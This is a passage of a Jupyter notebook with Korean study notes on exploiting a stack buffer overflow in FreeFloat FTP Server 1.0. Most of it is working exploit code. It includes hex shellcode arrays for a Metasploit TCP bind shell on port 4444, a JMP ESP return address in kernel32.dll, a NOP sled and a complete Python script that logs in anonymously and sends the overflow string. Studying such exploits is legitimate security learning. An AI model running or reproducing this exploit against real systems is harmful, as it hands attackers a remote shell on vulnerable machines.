      "- Return Address: \uc2a4\ud0dd\uc758 \ub9e8 \uc704\ub85c \uc9c1\uc811 \uc810\ud504\ud558\ub294\ub370 \uc0ac\uc6a9\ub418\ub294 4\ubc14\uc774\ud2b8 \uc8fc\uc18c. \ub2e4\uc74c \uacf5\uaca9\ucf54\ub4dc\uc5d0\uc11c \uc6b0\ub9ac\ub294 kernel32.dll\uc5d0\uc11c JMP ESP \uc9c0\uc2dc\ub97c \ud3ec\uc778\ud2b8\ud558\ub294 4 \ubc14\uc774\ud2b8 \uc8fc\uc18c\ub97c \uc0ac\uc6a9\ud560 \uac83\n",
      "- Padding: \uc258\ucf54\ub4dc \uc55e\uc5d0 \uc788\ub294 NOP(No Operation) \uc9c0\uc2dc\ub4e4. \uc774\uac83\uc740 \uacf5\uaca9\uc790\uac00 \uc9c1\uc811 \uc810\ud504 \uc8fc\uc18c\ub97c \ucd94\uce21\ud558\uac8c \ud574\uc900\ub2e4. \ub9cc\uc57d \uacf5\uaca9\uc790\uac00 NOP\uc5d0 \ucf54\ub4dc\ub97c \uc0bd\uc785\ud558\uac8c \ub418\uba74 \uc258\ucf54\ub4dc\ub97c \uc9c1\uc811 \uc2e4\ud589\ud560 \uc218 \uc788\ub2e4.\n",
      "- Sheel code: \uc5b4\uc148\ube14\ub9ac\uc5b4\ub85c \uc791\uc131\ub41c \uc870\uadf8\ub9c8\ud55c \ucf54\ub4dc \uc870\uac01\n",
      "\n",
      "### \uacf5\uaca9\uc758 \ud575\uc2ec \uc694\uc18c \ucd94\uac00\ud558\uae30\n",
      "\n",
      "1. \uacf5\uaca9\ucf54\ub4dc\uc758 \ud575\uc2ec\uc801\uc778 \ubd80\ubd84\uc744 \ub9cc\ub4e4 \uac83\n",
      "2. shellcode \ubcc0\uc218\uc5d0 \uba54\ud0c0\uc2a4\ud50c\ub85c\uc787 \ud504\ub808\uc784\uc6cc\ud06c\ub85c \uc0dd\uc131\ud55c \ud398\uc774\ub85c\ub4dc\ub97c(TCP 4444\ubc88 \ubc14\uc778\ub4dc) \ud5e5\uc2a4\uac12\uc73c\ub85c \uc778\ucf54\ub529\ud558\uc5ec \ud3ec\ud568\n",
      "3. overflow \ubcc0\uc218\uc5d0 \uc54c\ud30c\ubcb3 A(\ud5e5\uc2a4\ub85c \\x41)\uac00 246\uac1c \ud3ec\ud568\n",
      "4. return \uc8fc\uc18c \ubcc0\uc218\ub294 \uc2a4\ud0dd\uc758 \ub9e8 \uc704\ub85c \uc9c1\uc811 jump\ud558\uac8c \ub9cc\ub4dc\ub294 \uc9c0\uc2dc\uac00 \ub2f4\uaca8\uc788\ub294 kernel32.dll\uc758 \uc8fc\uc18c\ub97c \ud3ec\uc778\ud2b8\n",
      "5. padding \ubcc0\uc218\uc5d0\ub294 150\uac1c\uc758 NOP \uc9c0\uc2dc\uac00 \ud3ec\ud568\ub428\n",
      "6. \uc774\ub7ec\ud55c \ubaa8\ub4e0 \ubcc0\uc218\ub97c \uc870\ud569\ud558\uc5ec crach \ub77c\ub294 \ubcc0\uc218 \ud558\ub098\ub85c \ub9cc\ub4e6\n",
      "\n",
      "\n",
      "- [FreeFloat FTP Server - Buffer Overflow](http://hacksys.vfreaks.com/research/freefloat-ftp-server-buffer-overflow.html)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import socket\n",
      "import sys\n",
      "import time\n",
      "import struct\n",
      "\n",
      "shellcode = (\"\\xbf\\x5c\\x2a\\x11\\xb3\\xd9\\xe5\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\" \n",
      "\"\\xb1\\x56\\x83\\xc5\\x04\\x31\\x7d\\x0f\\x03\\x7d\\x53\\xc8\\xe4\\x4f\" \n",
      "\"\\x83\\x85\\x07\\xb0\\x53\\xf6\\x8e\\x55\\x62\\x24\\xf4\\x1e\\xd6\\xf8\" \n",
      "\"\\x7e\\x72\\xda\\x73\\xd2\\x67\\x69\\xf1\\xfb\\x88\\xda\\xbc\\xdd\\xa7\" \n",
      "\"\\xdb\\x70\\xe2\\x64\\x1f\\x12\\x9e\\x76\\x73\\xf4\\x9f\\xb8\\x86\\xf5\" \n",
      "\"\\xd8\\xa5\\x68\\xa7\\xb1\\xa2\\xda\\x58\\xb5\\xf7\\xe6\\x59\\x19\\x7c\" \n",
      "\"\\x56\\x22\\x1c\\x43\\x22\\x98\\x1f\\x94\\x9a\\x97\\x68\\x0c\\x91\\xf0\" \n",
      "\"\\x48\\x2d\\x76\\xe3\\xb5\\x64\\xf3\\xd0\\x4e\\x77\\xd5\\x28\\xae\\x49\" \n",
      "\"\\x19\\xe6\\x91\\x65\\x94\\xf6\\xd6\\x42\\x46\\x8d\\x2c\\xb1\\xfb\\x96\" \n",
      "\"\\xf6\\xcb\\x27\\x12\\xeb\\x6c\\xac\\x84\\xcf\\x8d\\x61\\x52\\x9b\\x82\" \n",
      "\"\\xce\\x10\\xc3\\x86\\xd1\\xf5\\x7f\\xb2\\x5a\\xf8\\xaf\\x32\\x18\\xdf\" \n",
      "\"\\x6b\\x1e\\xfb\\x7e\\x2d\\xfa\\xaa\\x7f\\x2d\\xa2\\x13\\xda\\x25\\x41\" \n",
      "\"\\x40\\x5c\\x64\\x0e\\xa5\\x53\\x97\\xce\\xa1\\xe4\\xe4\\xfc\\x6e\\x5f\" \n",
      "\"\\x63\\x4d\\xe7\\x79\\x74\\xb2\\xd2\\x3e\\xea\\x4d\\xdc\\x3e\\x22\\x8a\" \n",
      "\"\\x88\\x6e\\x5c\\x3b\\xb0\\xe4\\x9c\\xc4\\x65\\xaa\\xcc\\x6a\\xd5\\x0b\" \n",
      "\"\\xbd\\xca\\x85\\xe3\\xd7\\xc4\\xfa\\x14\\xd8\\x0e\\x8d\\x12\\x16\\x6a\" \n",
      "\"\\xde\\xf4\\x5b\\x8c\\xf1\\x58\\xd5\\x6a\\x9b\\x70\\xb3\\x25\\x33\\xb3\" \n",
      "\"\\xe0\\xfd\\xa4\\xcc\\xc2\\x51\\x7d\\x5b\\x5a\\xbc\\xb9\\x64\\x5b\\xea\" \n",
      "\"\\xea\\xc9\\xf3\\x7d\\x78\\x02\\xc0\\x9c\\x7f\\x0f\\x60\\xd6\\xb8\\xd8\" \n",
      "\"\\xfa\\x86\\x0b\\x78\\xfa\\x82\\xfb\\x19\\x69\\x49\\xfb\\x54\\x92\\xc6\" \n",
      "\"\\xac\\x31\\x64\\x1f\\x38\\xac\\xdf\\x89\\x5e\\x2d\\xb9\\xf2\\xda\\xea\" \n",
      "\"\\x7a\\xfc\\xe3\\x7f\\xc6\\xda\\xf3\\xb9\\xc7\\x66\\xa7\\x15\\x9e\\x30\" \n",
      "\"\\x11\\xd0\\x48\\xf3\\xcb\\x8a\\x27\\x5d\\x9b\\x4b\\x04\\x5e\\xdd\\x53\" \n",
      "\"\\x41\\x28\\x01\\xe5\\x3c\\x6d\\x3e\\xca\\xa8\\x79\\x47\\x36\\x49\\x85\" \n",
      "\"\\x92\\xf2\\x79\\xcc\\xbe\\x53\\x12\\x89\\x2b\\xe6\\x7f\\x2a\\x86\\x25\" \n",
      "\"\\x86\\xa9\\x22\\xd6\\x7d\\xb1\\x47\\xd3\\x3a\\x75\\xb4\\xa9\\x53\\x10\" \n",
      "\"\\xba\\x1e\\x53\\x31\")\n",
      "\n",
      "overflow = '\\x41' * 246\n",
      "ret = struct.pack('<L', 0x7C874413) # 7C8744313 JMP ESP kernel32.dll\n",
      "padding = '\\x90' * 150\n",
      "crash = overflow + ret + padding + shellcode"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 50
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "buf = (\"\\xd9\\xe1\\xd9\\x74\\x24\\xf4\\x5a\\xb8\\xe2\\x64\\x05\\x07\\x33\\xc9\" +\n",
      "\"\\xb1\\x56\\x31\\x42\\x18\\x83\\xea\\xfc\\x03\\x42\\xf6\\x86\\xf0\\xfb\" +\n",
      "\"\\x1e\\xcf\\xfb\\x03\\xde\\xb0\\x72\\xe6\\xef\\xe2\\xe1\\x62\\x5d\\x33\" +\n",
      "\"\\x61\\x26\\x6d\\xb8\\x27\\xd3\\xe6\\xcc\\xef\\xd4\\x4f\\x7a\\xd6\\xdb\" +\n",
      "\"\\x50\\x4a\\xd6\\xb0\\x92\\xcc\\xaa\\xca\\xc6\\x2e\\x92\\x04\\x1b\\x2e\" +\n",
      "\"\\xd3\\x79\\xd3\\x62\\x8c\\xf6\\x41\\x93\\xb9\\x4b\\x59\\x92\\x6d\\xc0\" +\n",
      "\"\\xe1\\xec\\x08\\x17\\x95\\x46\\x12\\x48\\x05\\xdc\\x5c\\x70\\x2e\\xba\" +\n",
      "\"\\x7c\\x81\\xe3\\xd8\\x41\\xc8\\x88\\x2b\\x31\\xcb\\x58\\x62\\xba\\xfd\" +\n",
      "\"\\xa4\\x29\\x85\\x31\\x29\\x33\\xc1\\xf6\\xd1\\x46\\x39\\x05\\x6c\\x51\" +\n",
      "\"\\xfa\\x77\\xaa\\xd4\\x1f\\xdf\\x39\\x4e\\xc4\\xe1\\xee\\x09\\x8f\\xee\" +\n",
      "\"\\x5b\\x5d\\xd7\\xf2\\x5a\\xb2\\x63\\x0e\\xd7\\x35\\xa4\\x86\\xa3\\x11\" +\n",
      "\"\\x60\\xc2\\x70\\x3b\\x31\\xae\\xd7\\x44\\x21\\x16\\x88\\xe0\\x29\\xb5\" +\n",
      "\"\\xdd\\x93\\x73\\xd2\\x12\\xae\\x8b\\x22\\x3c\\xb9\\xf8\\x10\\xe3\\x11\" +\n",
      "\"\\x97\\x18\\x6c\\xbc\\x60\\x5e\\x47\\x78\\xfe\\xa1\\x67\\x79\\xd6\\x65\" +\n",
      "\"\\x33\\x29\\x40\\x4f\\x3b\\xa2\\x90\\x70\\xee\\x65\\xc1\\xde\\x40\\xc6\" +\n",
      "\"\\xb1\\x9e\\x30\\xae\\xdb\\x10\\x6f\\xce\\xe3\\xfa\\x06\\xc8\\x2d\\xde\" +\n",
      "\"\\x4b\\xbf\\x4f\\xe0\\x7a\\x63\\xd9\\x06\\x16\\x8b\\x8f\\x91\\x8e\\x69\" +\n",
      "\"\\xf4\\x29\\x29\\x91\\xde\\x05\\xe2\\x05\\x56\\x40\\x34\\x29\\x67\\x46\" +\n",
      "\"\\x17\\x86\\xcf\\x01\\xe3\\xc4\\xcb\\x30\\xf4\\xc0\\x7b\\x3a\\xcd\\x83\" +\n",
      "\"\\xf6\\x52\\x9c\\x32\\x06\\x7f\\x76\\xd6\\x95\\xe4\\x86\\x91\\x85\\xb2\" +\n",
      "\"\\xd1\\xf6\\x78\\xcb\\xb7\\xea\\x23\\x65\\xa5\\xf6\\xb2\\x4e\\x6d\\x2d\" +\n",
      "\"\\x07\\x50\\x6c\\xa0\\x33\\x76\\x7e\\x7c\\xbb\\x32\\x2a\\xd0\\xea\\xec\" +\n",
      "\"\\x84\\x96\\x44\\x5f\\x7e\\x41\\x3a\\x09\\x16\\x14\\x70\\x8a\\x60\\x19\" +\n",
      "\"\\x5d\\x7c\\x8c\\xa8\\x08\\x39\\xb3\\x05\\xdd\\xcd\\xcc\\x7b\\x7d\\x31\" +\n",
      "\"\\x07\\x38\\x8d\\x78\\x05\\x69\\x06\\x25\\xdc\\x2b\\x4b\\xd6\\x0b\\x6f\" +\n",
      "\"\\x72\\x55\\xb9\\x10\\x81\\x45\\xc8\\x15\\xcd\\xc1\\x21\\x64\\x5e\\xa4\" +\n",
      "\"\\x45\\xdb\\x5f\\xed\")"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 67
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "buf"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 68,
       "text": [
        "'\\xd9\\xe1\\xd9t$\\xf4Z\\xb8\\xe2d\\x05\\x073\\xc9\\xb1V1B\\x18\\x83\\xea\\xfc\\x03B\\xf6\\x86\\xf0\\xfb\\x1e\\xcf\\xfb\\x03\\xde\\xb0r\\xe6\\xef\\xe2\\xe1b]3a&m\\xb8\\'\\xd3\\xe6\\xcc\\xef\\xd4Oz\\xd6\\xdbPJ\\xd6\\xb0\\x92\\xcc\\xaa\\xca\\xc6.\\x92\\x04\\x1b.\\xd3y\\xd3b\\x8c\\xf6A\\x93\\xb9KY\\x92m\\xc0\\xe1\\xec\\x08\\x17\\x95F\\x12H\\x05\\xdc\\\\p.\\xba|\\x81\\xe3\\xd8A\\xc8\\x88+1\\xcbXb\\xba\\xfd\\xa4)\\x851)3\\xc1\\xf6\\xd1F9\\x05lQ\\xfaw\\xaa\\xd4\\x1f\\xdf9N\\xc4\\xe1\\xee\\t\\x8f\\xee[]\\xd7\\xf2Z\\xb2c\\x0e\\xd75\\xa4\\x86\\xa3\\x11`\\xc2p;1\\xae\\xd7D!\\x16\\x88\\xe0)\\xb5\\xdd\\x93s\\xd2\\x12\\xae\\x8b\"<\\xb9\\xf8\\x10\\xe3\\x11\\x97\\x18l\\xbc`^Gx\\xfe\\xa1gy\\xd6e3)@O;\\xa2\\x90p\\xeee\\xc1\\xde@\\xc6\\xb1\\x9e0\\xae\\xdb\\x10o\\xce\\xe3\\xfa\\x06\\xc8-\\xdeK\\xbfO\\xe0zc\\xd9\\x06\\x16\\x8b\\x8f\\x91\\x8ei\\xf4))\\x91\\xde\\x05\\xe2\\x05V@4)gF\\x17\\x86\\xcf\\x01\\xe3\\xc4\\xcb0\\xf4\\xc0{:\\xcd\\x83\\xf6R\\x9c2\\x06\\x7fv\\xd6\\x95\\xe4\\x86\\x91\\x85\\xb2\\xd1\\xf6x\\xcb\\xb7\\xea#e\\xa5\\xf6\\xb2Nm-\\x07Pl\\xa03v~|\\xbb2*\\xd0\\xea\\xec\\x84\\x96D_~A:\\t\\x16\\x14p\\x8a`\\x19]|\\x8c\\xa8\\x089\\xb3\\x05\\xdd\\xcd\\xcc{}1\\x078\\x8dx\\x05i\\x06%\\xdc+K\\xd6\\x0borU\\xb9\\x10\\x81E\\xc8\\x15\\xcd\\xc1!d^\\xa4E\\xdb_\\xed'"
       ]
      }
     ],
     "prompt_number": 68
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uc545\uc131\ucf54\ub4dc \uc804\uc1a1\ud558\uae30\n",
      "\n",
      "1. Berkeley Socket API\ub85c \uacf5\uaca9\ub300\uc0c1 \ud638\uc2a4\ud2b8\uc758 TCP 21\ubc88 \ud3ec\ud2b8\uc5d0 \uc5f0\uacb0\n",
      "2. \uc5f0\uacb0\uc774 \uc131\uacf5\ud558\uba74 \uc775\uba85\uc758 \uc0ac\uc6a9\uc790\uc774\ub984\uacfc \ud328\uc2a4\uc6cc\ub4dc\ub97c \ud638\uc2a4\ud2b8\uc5d0 \uc804\uc1a1\ud558\uc5ec \uc778\uc99d\n",
      "3. \ucd5c\uc885\uc801\uc73c\ub85c FTP \uba85\ub839\uc5b4\uc778 'RETR\"\uacfc crash \ubcc0\uc218\ub97c \uc804\uc1a1\n",
      "\n",
      "\n",
      "- \ud574\ub2f9 \ud504\ub85c\uadf8\ub7a8\uc774 \uc0ac\uc6a9\uc790 \uc785\ub825\uac12\uc744 \uc81c\ub300\ub85c \uac80\uc99d\ud558\uc9c0 \uc54a\uae30 \ub54c\ubb38\uc5d0 \uc774\uac83\uc740 EIP \ub808\uc9c0\uc2a4\ud130\ub97c \ub36e\uc5b4\uc4f0\ub294 \uc2a4\ud0dd \uae30\ubc18\uc758 \ubc84\ud37c \uc624\ubc84\ud50c\ub85c\uc6b0\ub97c \ubc1c\uc0dd\uc2dc\ud0b4\n",
      "- \uadf8\ub7ec\uba74 \ud504\ub85c\uadf8\ub7a8\uc740 \uc258\ucf54\ub4dc\ub85c \uc9c1\uc811 \uc810\ud504\ud558\uc5ec \uc258\ucf54\ub4dc\ub97c \uc2e4\ud589"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
      "try:\n",
      "    s.connect((target, 21))\n",
      "except:\n",
      "    print '[-] Connection to ' + target + ' failed!'\n",
      "    sys.exit(0)\n",
      "    \n",
      "print '[*] Sending ' + len(crash) + ' ' + command + 'byte crash...'\n",
      "s.send('USER anonymous\\r\\n')\n",
      "s.rect(1024)\n",
      "s.send('PASS \\r\\n')\n",
      "s.recv(1024)\n",
      "s.send('RETR' + ' ' + crash + '\\r\\n')\n",
      "time.sleep(4)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "NameError",
       "evalue": "name 'target' is not defined",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
        "\u001b[0;32m<ipython-input-51-4e3fff48adce>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      3\u001b[0m     \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mconnect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m21\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;32mexcept\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 5\u001b[0;31m     \u001b[0;32mprint\u001b[0m \u001b[0;34m'[-] Connection to '\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mtarget\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m' failed!'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      6\u001b[0m     \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mexit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      7\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
        "\u001b[0;31mNameError\u001b[0m: name 'target' is not defined"
       ]
      }
     ],
     "prompt_number": 51
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uacf5\uaca9\ucf54\ub4dc \ubaa8\ub450 \ud1b5\ud569\ud558\uae30"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import socket\n",
      "import sys\n",
      "import time\n",
      "import struct\n",
      "\n",
      "if len(sys.argv) < 2:\n",
      "    print '[-] Usage:%s <target addr> <command>' % sys.argv[0] + '\\r'\n",
      "    print '[-] For example [filename.py 192.168.1.10 PWND] would do the trick.'\n",
      "    print '[-] Other options: AUTH, APPE, ALLO, ACCT'\n",
      "    sys.exit(0)\n",
      "    \n",
      "target = sys.argv[1]\n",
      "command = sys.argv[2]\n",
      "\n",
      "if len(sys.argv) > 2:\n",
      "    platform = sys.argv[2]\n",
      "    \n",
      "#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai \n",
      "# -b \"\\x00\\xff\\x0d\\x0a\\x3d\\x20\"\n",
      "\n",
      "shellcode = (\"\\xbf\\x5c\\x2a\\x11\\xb3\\xd9\\xe5\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\" \n",
      "\"\\xb1\\x56\\x83\\xc5\\x04\\x31\\x7d\\x0f\\x03\\x7d\\x53\\xc8\\xe4\\x4f\" \n",
      "\"\\x83\\x85\\x07\\xb0\\x53\\xf6\\x8e\\x55\\x62\\x24\\xf4\\x1e\\xd6\\xf8\" \n",
      "\"\\x7e\\x72\\xda\\x73\\xd2\\x67\\x69\\xf1\\xfb\\x88\\xda\\xbc\\xdd\\xa7\" \n",
      "\"\\xdb\\x70\\xe2\\x64\\x1f\\x12\\x9e\\x76\\x73\\xf4\\x9f\\xb8\\x86\\xf5\" \n",
      "\"\\xd8\\xa5\\x68\\xa7\\xb1\\xa2\\xda\\x58\\xb5\\xf7\\xe6\\x59\\x19\\x7c\" \n",
      "\"\\x56\\x22\\x1c\\x43\\x22\\x98\\x1f\\x94\\x9a\\x97\\x68\\x0c\\x91\\xf0\" \n",
      "\"\\x48\\x2d\\x76\\xe3\\xb5\\x64\\xf3\\xd0\\x4e\\x77\\xd5\\x28\\xae\\x49\" \n",
      "\"\\x19\\xe6\\x91\\x65\\x94\\xf6\\xd6\\x42\\x46\\x8d\\x2c\\xb1\\xfb\\x96\" \n",
      "\"\\xf6\\xcb\\x27\\x12\\xeb\\x6c\\xac\\x84\\xcf\\x8d\\x61\\x52\\x9b\\x82\" \n",
      "\"\\xce\\x10\\xc3\\x86\\xd1\\xf5\\x7f\\xb2\\x5a\\xf8\\xaf\\x32\\x18\\xdf\" \n",
      "\"\\x6b\\x1e\\xfb\\x7e\\x2d\\xfa\\xaa\\x7f\\x2d\\xa2\\x13\\xda\\x25\\x41\" \n",
      "\"\\x40\\x5c\\x64\\x0e\\xa5\\x53\\x97\\xce\\xa1\\xe4\\xe4\\xfc\\x6e\\x5f\" \n",
      "\"\\x63\\x4d\\xe7\\x79\\x74\\xb2\\xd2\\x3e\\xea\\x4d\\xdc\\x3e\\x22\\x8a\" \n",
      "\"\\x88\\x6e\\x5c\\x3b\\xb0\\xe4\\x9c\\xc4\\x65\\xaa\\xcc\\x6a\\xd5\\x0b\" \n",
      "\"\\xbd\\xca\\x85\\xe3\\xd7\\xc4\\xfa\\x14\\xd8\\x0e\\x8d\\x12\\x16\\x6a\" \n",
      "\"\\xde\\xf4\\x5b\\x8c\\xf1\\x58\\xd5\\x6a\\x9b\\x70\\xb3\\x25\\x33\\xb3\" \n",
      "\"\\xe0\\xfd\\xa4\\xcc\\xc2\\x51\\x7d\\x5b\\x5a\\xbc\\xb9\\x64\\x5b\\xea\" \n",
      "\"\\xea\\xc9\\xf3\\x7d\\x78\\x02\\xc0\\x9c\\x7f\\x0f\\x60\\xd6\\xb8\\xd8\" \n",
      "\"\\xfa\\x86\\x0b\\x78\\xfa\\x82\\xfb\\x19\\x69\\x49\\xfb\\x54\\x92\\xc6\" \n",
      "\"\\xac\\x31\\x64\\x1f\\x38\\xac\\xdf\\x89\\x5e\\x2d\\xb9\\xf2\\xda\\xea\" \n",
      "\"\\x7a\\xfc\\xe3\\x7f\\xc6\\xda\\xf3\\xb9\\xc7\\x66\\xa7\\x15\\x9e\\x30\" \n",
      "\"\\x11\\xd0\\x48\\xf3\\xcb\\x8a\\x27\\x5d\\x9b\\x4b\\x04\\x5e\\xdd\\x53\" \n",
      "\"\\x41\\x28\\x01\\xe5\\x3c\\x6d\\x3e\\xca\\xa8\\x79\\x47\\x36\\x49\\x85\" \n",
      "\"\\x92\\xf2\\x79\\xcc\\xbe\\x53\\x12\\x89\\x2b\\xe6\\x7f\\x2a\\x86\\x25\" \n",
      "\"\\x86\\xa9\\x22\\xd6\\x7d\\xb1\\x47\\xd3\\x3a\\x75\\xb4\\xa9\\x53\\x10\" \n",
      "\"\\xba\\x1e\\x53\\x31\")\n",
      "\n",
      "overflow = '\\x41' * 246\n",
      "ret = struct.pack('<L', 0x7C874413) # 7C8744313 JMP ESP kernel32.dll\n",
      "padding = '\\x90' * 150\n",
      "crash = overflow + ret + padding + shellcode\n",
      "\n",
      "print '\\\n",
      "[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow\\n\\\n",
      "[*] Author: Craig Freyman (@cd1zz)\\n\\\n",
      "[*] Connecting to ' + target\n",
      "\n",
      "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
      "try:\n",
      "    s.connect((target, 21))\n",
      "except:\n",
      "    print '[-] Connection to ' + target + ' failed!'\n",
      "    sys.exit(0)\n",
      "\n",
      "print '[*] Sending ' + len(crash) + ' ' + command + ' byte crash...'\n",
      "s.send('USER anonymous\\r\\n')\n",
      "s.recv(1024)\n",
      "s.send('PASS \\r\\n')\n",
      "s.recv(1024)\n",
      "s.send(command + ' ' + crash + '\\r\\n')\n",
      "time.sleep(4)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[*] Freefloat FTP 1.0 Any Non Implemented Command Buffer Overflow\n",
        "[*] Author: Craig Freyman (@cd1zz)\n",
        "[*] Connecting to -f\n",
        "[-] Connection to -f failed!"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "ename": "SystemExit",
       "evalue": "0",
       "output_type": "pyerr",
       "traceback": [
        "An exception has occurred, use %tb to see the full traceback.\n",
        "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 0\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stderr",
       "text": [
        "To exit: use 'exit', 'quit', or Ctrl-D.\n"
       ]
      }
     ],
     "prompt_number": 69
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "----\n",
      "\n",
      "#### ()\uc758 \ud65c\uc6a9 in string\n",
      "\n",
      "- () \uc548\uc5d0\uc11c + \uc5c6\uc774 \uc4f0\uba74 \ubaa8\ub450 \ub611\uac19\uc774 \uc801\uc6a9\ub428\n",
      "- ()\ub294 \ubaa8\ub450 \ud558\ub098\uc758 \ubb38\uc790\uc5f4\ub85c \ub9cc\ub4e4\uc5b4 \uc8fc\ub294 \uae30\ub2a5"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "s = ('nice'\n",
      "'good')\n",
      "s2 = ('nice' +\n",
      "      'good')\n",
      "s3 = ('nice' +\\\n",
      "     'good')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 78
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "s == s2 == s3"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 79,
       "text": [
        "True"
       ]
      }
     ],
     "prompt_number": 79
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print s\n",
      "print s2\n",
      "print s3"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "nicegood\n",
        "nicegood\n",
        "nicegood\n"
       ]
      }
     ],
     "prompt_number": 80
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "-----"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Shellcode \uc791\uc131\uc2dc \uc8fc\uc758\uc0ac\ud56d in stack buffer overflow\n",
      "\n",
      "1. shellcode == payload \uc774\ubbc0\ub85c \uba3c\uc800 \uc81c\ub300\ub85c \uc791\ub3d9\ud558\ub294\uc9c0 \ud655\uc778\n",
      "2. retturn address\ub97c \uc5b4\ub5bb\uac8c \uc124\uc815\ud560 \uac83\uc778\uac00?\n",
      "  - return address\uc5d0 \ubc14\ub85c shellcode \uc8fc\uc18c\ub97c \ub123\uc73c\uba74 \uc548\ub418\ub098??(\uc77c\ubc18\uc801\uc73c\ub85c \uc258\ucf54\ub4dc \uc8fc\uc18c\ub97c \uc54c\uae30\uac00 \ud798\ub4e4\ub2e4. \uadf8\ub798\uc11c esp\uac00 \uac00\ub9ac\ud0a4\ub294 \uacf3\uc774 \uc258\ucf54\ub4dc\uac00 \uc788\ub294 \uacf3\uc758 \uc8fc\uc18c\uc640 \uc778\uc811\ud558\uae30 \ub54c\ubb38\uc774\ub2e4. \ub9ac\ud134\uc8fc\uc18c \ub2e4\uc74c\uc5d0 shellcode\ub97c \uc704\uce58\ud558\uac8c\ub054 \ud588\uae30 \ub54c\ubb38\uc5d0 \ub9ac\ud134\ubb38\uc744 \ub9cc\ub098\uac8c \ub418\uba74 \ud604\uc7ac\uc758 esp\uc758 \uc704\uce58\ub294 \ub9ac\ud134 \ubc14\ub85c \ub2e4\uc74c\uc778 \uc258\ucf54\ub4dc\ub97c \uac00\ub9ac\ud0a4\uac8c \ub41c\ub2e4.)\n",
      "  - \uc65c \uad73\uc774 padding + shellcode\ub85c \ub9cc\ub4e4\uace0, dll\uc744 \ub4e4\uc5b4\uac00\uc11c jmp esp\ub97c \ucc3e\uae30\ub97c \ud558\ub098?\n",
      "  - \uc5ed\uc0ac\uc801\uc778 \uc774\uc720: \uc2a4\ud0dd\uc774 4\ubc14\uc774\ud2b8\ub098 3\ubc14\uc774\ud2b8\uac00 \uc81c\ub300\ub85c \ub41c \uc704\uce58\uc778\ub370 \uacc4\uc0b0\uc744 \uc798\ubabb\ud558\uac8c \ub418\uba74 \uc258\ucf54\ub4dc\uac00 \uc815\ud655\ud788 \uc704\uce58\ud55c \uc8fc\uc18c\ub97c \ud655\uc778\ud558\uae30\uac00 \uc5b4\ub835\ub2e4. \uadf8\ub807\uae30 \ub54c\ubb38\uc5d0 \ucda9\ubd84\ud55c NOP\uc744 \ub123\uc5b4 \uc815\ud655\ud55c \uc704\uce58\ub97c \ubab0\ub77c\ub3c4 \ub300\ucda9 \ucc0d\uc73c\uba74 \uc5b4\ucc28\ud53c NOP\uc774\uae30 \ub54c\ubb38\uc5d0 \uacb0\uad6d\uc740 \uc258\ucf54\ub4dc\ub97c \ub9cc\ub098\uc11c \uc2e4\ud589\uc774 \ub41c\ub2e4.\n",
      "3. padding \uc124\uc815(NOP)\n",
      "4. \uc2e4\uc81c \ub0b4\uac00 \ud560 \ud589\ub3d9\uc778 shellcode\n",
      "\n",
